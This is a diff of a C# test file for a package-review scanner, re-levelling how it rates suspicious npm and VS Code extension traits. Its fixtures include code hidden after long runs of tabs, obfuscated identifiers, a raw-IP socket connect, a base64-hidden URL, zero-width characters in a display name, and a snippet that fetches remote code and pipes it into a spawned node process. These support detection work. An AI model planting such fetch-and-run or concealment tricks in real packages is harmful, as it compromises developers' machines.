@@ -213,11 +213,24 @@ public sealed class PackageReviewTests : IDisposable
     }
 
     [Fact]
-    public void Code_after_hundreds_of_spaces_on_a_line_is_noteworthy()
+    public void Code_after_hundreds_of_spaces_is_review_alone_and_noteworthy_in_an_install_script()
     {
-        var r = Review(Tgz("animate-4.0.2.tgz", ("package/package.json", """{"name":"animate","version":"4.0.2","main":"index.js"}"""),
-            ("package/index.js", "module.exports = {};" + new string('\t', 400) + "global['_V']='A4';")));
-        Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "transformed code" } && f.Detail.Contains("spaces", StringComparison.Ordinal));
+        var code = "module.exports = {};" + new string('\t', 400) + "global['_V']='A4';";
+        var alone = Review(Tgz("animate-4.0.2.tgz", ("package/package.json", """{"name":"animate","version":"4.0.2","main":"index.js"}"""), ("package/index.js", code)));
+        Assert.Contains(alone.Findings, f => f is { Rule: "package/space-run", Level: "review" });
+        var install = Review(Tgz("animate-4.0.3.tgz", ("package/package.json", """{"name":"animate","version":"4.0.3","scripts":{"postinstall":"node index.js"}}"""),
+            ("package/index.js", code)));
+        Assert.Contains(install.Findings, f => f is { Rule: "package/space-run", Level: "noteworthy" });
+    }
+
+    [Theory]
+    [InlineData("package/string-array", "var _0x1a2b;_0x2a2b;_0x3a2b;_0x4a2b;_0x5a2b;_0x6a2b;_0x7a2b;_0x8a2b;_0x9a2b")]
+    [InlineData("package/raw-address-socket", "s.connect(('203.0.113.9', 443))")]
+    [InlineData("package/hidden-url", "const K = 'aHR0cHM6Ly9leGFtcGxlLmludmFsaWQvYg==';")]
+    public void One_heuristic_alone_is_review_and_noteworthy_in_a_file_that_runs_at_install(string rule, string code)
+    {
+        Assert.Equal("review", PackageReview.Scan("index.js", code, install: false, default, peel: false).Single(f => f.Rule == rule).Level);
+        Assert.Equal("noteworthy", PackageReview.Scan("index.js", code, install: true, default, peel: false).Single(f => f.Rule == rule).Level);
     }
 
     [Fact]
@@ -237,7 +250,8 @@ public sealed class PackageReviewTests : IDisposable
             ("package/index.js", "const K = 'aHR0cHM6Ly9leGFtcGxlLmludmFsaWQvYg==';\nmodule.exports = {};")));
         Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "process", Path: "package/lib/compile.js" } && f.Detail.Contains("outlives", StringComparison.Ordinal));
         Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "transformed code", Path: "package/lib/compile.js" } && f.Detail.Contains("XOR", StringComparison.Ordinal));
-        Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "transformed code", Path: "package/index.js" } && f.Detail.Contains("URL hidden", StringComparison.Ordinal));
+        // Re-levelled in 2.8.0: index.js does not run at install.
+        Assert.Contains(r.Findings, f => f is { Level: "review", Category: "transformed code", Path: "package/index.js" } && f.Detail.Contains("URL hidden", StringComparison.Ordinal));
         var fed = Review(Tgz("sdk-1.0.6.tgz", ("package/package.json", """{"name":"sdk","version":"1.0.6","main":"main.js"}"""),
             ("package/main.js", "const axios = require('axios'), { spawn } = require('child_process');\n(async () => { const s = (await axios.get(process.env.U)).data.content;\nconst c = spawn('node', [], { stdio: ['pipe', 'ignore', 'ignore'] }); c.stdin.write(s); c.stdin.end(); })();")));
         Assert.Contains(fed.Findings, f => f is { Level: "noteworthy", Category: "remote code", Path: "package/main.js" });
@@ -446,12 +460,15 @@ public sealed class PackageReviewTests : IDisposable
     }
 
     [Fact]
-    public void A_vscode_extension_whose_display_name_carries_zero_width_characters_is_noteworthy()
+    public void A_vscode_display_name_with_zero_width_characters_is_review_alone_and_noteworthy_when_it_activates_at_start()
     {
         var pkg = """{"name":"sol","publisher":"acme","version":"1.0.0","displayName":"so​lid​ity","main":"./extension.js"}""";
         var r = Review(Zip("acme.sol-1.0.0.vsix", ("extension/package.json", U(pkg)), ("extension/extension.js", U("exports.activate = () => {};"))));
-        Assert.Equal("noteworthy", r.Review);
-        Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "name" } && f.Detail.Contains("so\\u200blid", StringComparison.Ordinal));
+        Assert.Contains(r.Findings, f => f is { Rule: "package/invisible-name", Level: "review" } && f.Detail.Contains("so\\u200blid", StringComparison.Ordinal));
+        var start = pkg.Replace("\"main\"", "\"activationEvents\":[\"onStartupFinished\"],\"main\"", StringComparison.Ordinal);
+        var s = Review(Zip("acme.sol-1.0.1.vsix", ("extension/package.json", U(start)), ("extension/extension.js", U("exports.activate = () => {};"))));
+        Assert.Equal("noteworthy", s.Review);
+        Assert.Contains(s.Findings, f => f is { Rule: "package/invisible-name", Level: "noteworthy" });
     }
 
     [Fact]
